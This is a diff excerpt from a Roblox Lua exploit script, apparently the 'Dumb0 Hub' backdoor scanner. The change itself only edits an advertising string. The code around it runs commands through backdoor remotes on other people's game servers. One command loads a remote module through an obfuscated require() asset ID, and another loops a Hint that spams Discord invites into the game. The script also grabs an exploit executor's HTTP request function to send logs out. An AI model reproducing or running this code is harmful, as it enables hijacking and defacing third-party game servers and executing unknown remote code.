@@ -1561,7 +1561,7 @@ local script = G2L["20"];
 	
 	--				runRemote(backdoor, "a=Instance.new('Hint',workspace)while true do a.Text='LALOL Hub Backdoor | discord.gg/XXqzxT7E5z | Free and FASTEST Backdoor Scanner'for b=1,13 do a.Parent=workspace;wait(1)a.Parent=nil;wait(0.5)end;wait(60)end")
 					runRemote(remote, "require(171016405.1884*69)")			
-					runRemote(remote, "a=Instance.new('Hint')a.Text='Dumb0 Hub Backdoor | https://discord.gg/4CvKpYVJ4c | Free & FASTEST Backdoor Scanner'while true do a.Parent=workspace;wait(15)a:Remove()wait(30)end")
+					runRemote(remote, "a=Instance.new('Hint')a.Text='Dumb0 Hub Backdoor | .gg/4CvKpYVJ4c | Free & FASTEST & EASIEST Backdoor Scanner'while true do a.Parent=workspace;wait(15)a:Remove()wait(30)end")
 					
 					local request = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request
 					if request and not _G.Dumb0_Hub_Backdoor_Logs_Disabled then 
